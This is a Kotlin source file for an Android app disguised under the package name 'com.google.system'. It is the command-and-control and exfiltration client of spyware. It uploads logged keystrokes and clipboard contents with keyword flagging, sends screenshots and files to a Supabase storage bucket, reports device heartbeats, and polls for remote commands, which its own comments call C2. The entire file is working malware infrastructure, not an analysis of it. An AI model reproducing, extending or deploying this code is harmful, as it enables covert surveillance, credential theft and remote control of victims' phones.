package com.google.system

import android.util.Log
import com.google.gson.Gson
import com.google.gson.JsonParser
import kotlinx.coroutines.*
import kotlinx.coroutines.channels.awaitClose
import kotlinx.coroutines.flow.Flow
import kotlinx.coroutines.flow.callbackFlow
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONArray
import org.json.JSONObject
import java.io.IOException
import java.util.UUID
import java.util.concurrent.TimeUnit

/**
 * Supabase REST + Realtime client.
 *
 * Uses OkHttp (already in project) instead of supabase-kt to avoid
 * Kotlin/ktor version conflicts. Provides the same functionality:
 *   - CRUD on devices, keylogs, commands tables
 *   - Realtime subscription via Server-Sent Events (Postgres LISTEN/NOTIFY)
 *   - Device heartbeat + module sync
 *   - Keylog upload with keyword matching
 *   - Command status updates
 */
object SupabaseClient {

    private const val TAG = "SupabaseClient"
    private val JSON_MEDIA = "application/json".toMediaType()
    private val gson = Gson()

    private val client = OkHttpClient.Builder()
        .connectTimeout(15, TimeUnit.SECONDS)
        .readTimeout(30, TimeUnit.SECONDS)
        .writeTimeout(30, TimeUnit.SECONDS)
        .build()

    /* Cached device_id — set once when first syncing */
    var deviceId: String? = null

    /* Is the client configured with real credentials? */
    fun isConfigured(): Boolean =
        SupabaseConfig.SUPABASE_URL.contains("your-project").not()

    /* ================================================================
     *  REST HELPERS
     * ================================================================ */

    private fun apiUrl(table: String): String =
        "${SupabaseConfig.SUPABASE_URL}/rest/v1/$table"

    private fun headers(): Headers = Headers.Builder()
        .add("apikey", SupabaseConfig.SUPABASE_ANON_KEY)
        .add("Authorization", "Bearer ${SupabaseConfig.SUPABASE_ANON_KEY}")
        .add("Content-Type", "application/json")
        .add("Prefer", "return=minimal")
        .build()

    /** Generic GET */
    private fun get(
        table: String,
        query: String = "",
        select: String = "*"
    ): JSONArray? {
        val url = "${apiUrl(table)}?select=$select$query"
        val req = Request.Builder().url(url).headers(headers()).get().build()
        return executeJsonArray(req)
    }

    /** Generic POST (insert) */
    private fun post(table: String, body: String): Int {
        val req = Request.Builder()
            .url(apiUrl(table))
            .headers(headers())
            .post(body.toRequestBody(JSON_MEDIA))
            .build()
        return executeStatus(req)
    }

    /** Generic PATCH (update) */
    private fun patch(table: String, query: String, body: String): Int {
        val url = "${apiUrl(table)}?$query"
        val req = Request.Builder()
            .url(url)
            .headers(headers())
            .patch(body.toRequestBody(JSON_MEDIA))
            .build()
        return executeStatus(req)
    }

    private fun executeJsonArray(req: Request): JSONArray? {
        return try {
            val resp = client.newCall(req).execute()
            val body = resp.body?.string()
            if (resp.isSuccessful && body != null) JSONArray(body) else null
        } catch (e: Exception) { Log.e(TAG, "GET fail", e); null }
    }

    private fun executeStatus(req: Request): Int {
        return try {
            val resp = client.newCall(req).execute()
            resp.close()
            resp.code
        } catch (e: Exception) { Log.e(TAG, "request fail", e); -1 }
    }

    /* ================================================================
     *  DEVICE SYNC
     * ================================================================ */

    /**
     * Upsert device info. Returns the device_id string.
     */
    fun syncDevice(
        model: String
    ): String? {
        val id = deviceId ?: "device_${UUID.randomUUID().toString().take(8)}"
        val json = JSONObject().apply {
            put("device_id", id)
            put("model", model)
            put("android_version", "${android.os.Build.VERSION.RELEASE}")
            put("status", "online")
            put("last_seen", nowIso())
        }

        val url = "${apiUrl(SupabaseConfig.TABLE_DEVICES)}?on_conflict=device_id"
        val req = Request.Builder()
            .url(url)
            .headers(Headers.Builder()
                .add("apikey", SupabaseConfig.SUPABASE_ANON_KEY)
                .add("Authorization", "Bearer ${SupabaseConfig.SUPABASE_ANON_KEY}")
                .add("Content-Type", "application/json")
                .add("Prefer", "resolution=merge-duplicates")
                .build())
            .post(json.toString().toRequestBody(JSON_MEDIA))
            .build()

        val code = executeStatus(req)
        if (code in 200..299) {
            deviceId = id
            Log.i(TAG, "syncDevice -> HTTP $code (id=$id)")
            return id
        } else {
            Log.w(TAG, "syncDevice failed: HTTP $code")
            return null
        }
    }

    /** Update last_seen + modules without touching other fields */
    fun heartbeat(modules: List<String>) {
        val id = deviceId ?: return
        val json = JSONObject().apply {
            put("last_seen", nowIso())
            put("modules", JSONArray(modules))
        }
        val code = patch(SupabaseConfig.TABLE_DEVICES,
            "device_id=eq.$id", json.toString())
        Log.d(TAG, "heartbeat -> HTTP $code")
    }

    /* ================================================================
     *  STARTUP MARKER — proves the app launched
     * ================================================================ */

    fun reportStartup(): Boolean {
        val json = JSONObject().apply {
            put("device_id", "startup_${UUID.randomUUID().toString().take(8)}")
            put("app_name", "system")
            put("content", "APP_STARTED at ${nowIso()}")
            put("source", "startup")
        }
        val code = post(SupabaseConfig.TABLE_KEYLOGS, json.toString())
        val ok = code in 200..299
        if (ok) Log.i(TAG, "startup marker posted")
        else Log.w(TAG, "startup marker failed: HTTP $code")
        return ok
    }

    /* ================================================================
     *  KEYLOG SYNC
     * ================================================================ */

    /**
     * Upload keylog entry. Returns true if HTTP 2xx.
     * Also locally matches keywords for the caller to act on.
     */
    fun syncKeylog(appName: String, content: String, source: String = "kernel"): Boolean {
        val id = deviceId ?: return false
        val matched = SupabaseConfig.KEYWORD_ALERTS.filter { content.contains(it, ignoreCase = true) }

        val json = JSONObject().apply {
            put("device_id", id)
            put("app_name", appName)
            put("content", content)
            put("source", source)
            if (matched.isNotEmpty()) put("keywords", JSONArray(matched))
        }

        val code = post(SupabaseConfig.TABLE_KEYLOGS, json.toString())
        val ok = code in 200..299
        Log.i(TAG, "syncKeylog ($appName) -> HTTP $code matched=$matched")
        return ok
    }

    /* ================================================================
     *  COMMAND FLOW
     * ================================================================ */

    /**
     * Fetch pending commands for this device.
     */
    fun fetchPendingCommands(): List<JSONObject> {
        val id = deviceId ?: return emptyList()
        val result = get(
            SupabaseConfig.TABLE_COMMANDS,
            query = "&device_id=eq.$id&status=eq.pending&order=created_at.asc",
            select = "id,action,payload,created_at"
        ) ?: return emptyList()

        val cmds = mutableListOf<JSONObject>()
        for (i in 0 until result.length()) {
            cmds.add(result.getJSONObject(i))
        }
        return cmds
    }

    /**
     * Fetch recent keylogs for honeytoken monitoring.
     */
    fun fetchRecentKeylogs(limit: Int = 50): List<JSONObject> {
        val result = get(
            SupabaseConfig.TABLE_KEYLOGS,
            query = "&order=logged_at.desc&limit=$limit",
            select = "id,content,logged_at"
        ) ?: return emptyList()

        val logs = mutableListOf<JSONObject>()
        for (i in 0 until result.length()) {
            logs.add(result.getJSONObject(i))
        }
        return logs
    }

    /**
     * Mark a command as 'executed' or 'failed' with optional result payload.
     */
    fun markCommandExecuted(commandId: String, success: Boolean, resultPayload: JSONObject? = null) {
        val status = if (success) "executed" else "failed"
        val json = JSONObject().apply {
            put("status", status)
            put("executed_at", nowIso())
            if (resultPayload != null) put("result", resultPayload)
        }
        val code = patch(SupabaseConfig.TABLE_COMMANDS,
            "id=eq.$commandId", json.toString())
        Log.i(TAG, "markCommand $commandId -> $status (HTTP $code)")
    }

    /* ================================================================
     *  REALTIME (via SSE / Postgres LISTEN)
     * ================================================================ */

    /**
     * Subscribe to new commands for this device via polling (simple, reliable).
     * Returns a Flow of command JSON objects.
     *
     * For true Realtime, use Supabase's Realtime server — but that requires
     * the Realtime client library. The polling approach works without extra
     * dependencies and is sufficient for C2.
     */
    fun observeCommands(pollIntervalMs: Long = 15_000L): Flow<JSONObject> = callbackFlow {
        val id = deviceId
        if (id == null) {
            Log.w(TAG, "observeCommands: deviceId not set")
            close()
            return@callbackFlow
        }

        val job = CoroutineScope(Dispatchers.IO).launch {
            val seen = mutableSetOf<String>()
            while (isActive) {
                val cmds = fetchPendingCommands()
                for (cmd in cmds) {
                    val cid = cmd.optString("id", "")
                    if (cid.isNotEmpty() && seen.add(cid)) {
                        trySend(cmd)
                    }
                }
                delay(pollIntervalMs)
            }
        }

        awaitClose { job.cancel() }
    }

    /* ================================================================
     *  ALERTS
     * ================================================================ */

    /**
     * Post an alert row (e.g. honeytoken trigger) to the alerts table.
     * The Discord Edge Function picks this up and sends a notification.
     */
    fun postAlert(alert: JSONObject): Boolean {
        val code = post("alerts", alert.toString())
        val ok = code in 200..299
        if (ok) Log.i(TAG, "alert posted: ${alert.optString("alert_type")}")
        else Log.w(TAG, "alert post failed: HTTP $code")
        return ok
    }

    /* ================================================================
     *  STORAGE (replaces S3)
     * ================================================================ */

    /** Default public bucket name — create via Supabase Dashboard: Storage → New Bucket */
    private const val STORAGE_BUCKET = "incident-artifacts"

    private fun storageUrl(path: String): String =
        "${SupabaseConfig.SUPABASE_URL}/storage/v1/object/$STORAGE_BUCKET/$path"

    private fun storageHeaders(): Headers = Headers.Builder()
        .add("apikey", SupabaseConfig.SUPABASE_ANON_KEY)
        .add("Authorization", "Bearer ${SupabaseConfig.SUPABASE_ANON_KEY}")
        .build()

    /**
     * Upload a file to Supabase Storage.
     * @param remotePath  e.g. "device_abc123/logs_2025-01-01.zip"
     * @param file         local file to upload
     * @param upsert       overwrite if exists (default true)
     * @return public URL of the uploaded object (or null on failure)
     */
    fun uploadFile(remotePath: String, file: java.io.File, upsert: Boolean = true): String? {
        return try {
            val url = "${SupabaseConfig.SUPABASE_URL}/storage/v1/object/$STORAGE_BUCKET/$remotePath"
            val contentType = when {
                remotePath.endsWith(".zip") -> "application/zip"
                remotePath.endsWith(".log") -> "text/plain"
                remotePath.endsWith(".png") -> "image/png"
                remotePath.endsWith(".jpg") || remotePath.endsWith(".jpeg") -> "image/jpeg"
                remotePath.endsWith(".mp4") -> "video/mp4"
                else -> "application/octet-stream"
            }

            val body = file.readBytes().toRequestBody(contentType.toMediaType())
            val req = Request.Builder()
                .url(url)
                .headers(storageHeaders())
                .apply { if (upsert) addHeader("x-upsert", "true") }
                .post(body)
                .build()

            val resp = client.newCall(req).execute()
            resp.use {
                if (it.isSuccessful) {
                    val publicUrl = "${SupabaseConfig.SUPABASE_URL}/storage/v1/object/public/$STORAGE_BUCKET/$remotePath"
                    Log.i(TAG, "uploadFile -> $publicUrl (${file.length()}B)")
                    publicUrl
                } else {
                    Log.e(TAG, "uploadFile failed: HTTP ${it.code} ${it.body?.string()}")
                    null
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "uploadFile exception", e)
            null
        }
    }

    /**
     * Generate a public URL for an already-uploaded object.
     */
    fun publicFileUrl(remotePath: String): String =
        "${SupabaseConfig.SUPABASE_URL}/storage/v1/object/public/$STORAGE_BUCKET/$remotePath"

    /**
     * Delete a file from Supabase Storage.
     */
    fun deleteFile(remotePath: String): Boolean {
        return try {
            val url = "${SupabaseConfig.SUPABASE_URL}/storage/v1/object/$STORAGE_BUCKET/$remotePath"
            val req = Request.Builder()
                .url(url)
                .headers(storageHeaders())
                .delete()
                .build()
            val resp = client.newCall(req).execute()
            resp.use { it.isSuccessful }
        } catch (e: Exception) {
            Log.e(TAG, "deleteFile exception", e)
            false
        }
    }

    /**
     * List all files in a given folder prefix.
     */
    fun listFiles(prefix: String): List<String> {
        return try {
            val url = "${SupabaseConfig.SUPABASE_URL}/storage/v1/object/list/$STORAGE_BUCKET"
            val body = JSONObject().apply {
                put("prefix", prefix)
                put("limit", 100)
                put("offset", 0)
                put("sortBy", JSONObject().apply {
                    put("column", "created_at")
                    put("order", "desc")
                })
            }

            val req = Request.Builder()
                .url(url)
                .headers(storageHeaders())
                .post(body.toString().toRequestBody(JSON_MEDIA))
                .build()

            val arr = executeJsonArray(req) ?: return emptyList()
            (0 until arr.length()).map { arr.getJSONObject(it).optString("name", "") }
                .filter { it.isNotEmpty() }
        } catch (e: Exception) {
            Log.e(TAG, "listFiles exception", e)
            emptyList()
        }
    }

    /* ================================================================
     *  COROUTINE HELPERS (Phase 2 — No Firebase, pure REST)
     * ================================================================ */

    /** Screenshots bucket — create via Supabase Dashboard: Storage → New Bucket → "screenshots" */
    private const val SCREENSHOT_BUCKET = "screenshots"

    /**
     * Upload a compressed .png screenshot to the [SCREENSHOT_BUCKET] using
     * standard HTTP REST. Wraps the synchronous upload in Dispatchers.IO.
     *
     * @param devicePrefix  e.g. "device_abc12" — folder prefix in the bucket
     * @param pngBytes      compressed PNG bytes
     * @return public URL of the uploaded screenshot, or null on failure
     */
    suspend fun uploadScreenshot(devicePrefix: String, pngBytes: ByteArray): String? = withContext(Dispatchers.IO) {
        try {
            val fileName = "screenshot_${System.currentTimeMillis()}.png"
            val remotePath = "$devicePrefix/$fileName"
            val url = "${SupabaseConfig.SUPABASE_URL}/storage/v1/object/$SCREENSHOT_BUCKET/$remotePath"

            val body = pngBytes.toRequestBody("image/png".toMediaType())
            val req = Request.Builder()
                .url(url)
                .header("apikey", SupabaseConfig.SUPABASE_ANON_KEY)
                .header("Authorization", "Bearer ${SupabaseConfig.SUPABASE_ANON_KEY}")
                .header("x-upsert", "true")
                .post(body)
                .build()

            val resp = client.newCall(req).execute()
            resp.use {
                if (it.isSuccessful) {
                    val publicUrl = "${SupabaseConfig.SUPABASE_URL}/storage/v1/object/public/$SCREENSHOT_BUCKET/$remotePath"
                    Log.i(TAG, "uploadScreenshot -> $publicUrl (${pngBytes.size}B)")
                    publicUrl
                } else {
                    Log.e(TAG, "uploadScreenshot failed: HTTP ${it.code} ${it.body?.string()}")
                    null
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "uploadScreenshot exception", e)
            null
        }
    }

    /**
     * Insert a captured keylog entry into the Supabase Postgres table.
     * Pure REST, no Firebase. Runs on Dispatchers.IO.
     *
     * @param appName  the foreground app package name
     * @param content  the captured keystroke / clipboard content
     * @param source   "kernel" | "accessibility" | "clipboard"
     * @return true if HTTP 2xx
     */
    suspend fun insertKeylog(appName: String, content: String, source: String = "kernel"): Boolean = withContext(Dispatchers.IO) {
        val id = deviceId ?: return@withContext false
        val matched = SupabaseConfig.KEYWORD_ALERTS.filter { content.contains(it, ignoreCase = true) }

        val json = JSONObject().apply {
            put("device_id", id)
            put("app_name", appName)
            put("content", content)
            put("source", source)
            if (matched.isNotEmpty()) put("keywords", JSONArray(matched))
        }

        val code = post(SupabaseConfig.TABLE_KEYLOGS, json.toString())
        val ok = code in 200..299
        if (ok) Log.i(TAG, "insertKeylog ($appName) -> HTTP $code matched=$matched")
        else Log.w(TAG, "insertKeylog failed: HTTP $code")
        ok
    }

    /* ================================================================
     *  INTERNALS
     * ================================================================ */

    private fun getPublicIp(): String {
        return try {
            val req = Request.Builder().url("https://api.ipify.org?format=json").get().build()
            val resp = client.newCall(req).execute()
            val json = JsonParser.parseString(resp.body?.string()).asJsonObject
            json.get("ip").asString
        } catch (_: Exception) { "unknown" }
    }

    private fun nowIso(): String =
        java.text.SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss'Z'", java.util.Locale.US).apply {
            timeZone = java.util.TimeZone.getTimeZone("UTC")
        }.format(java.util.Date())
}
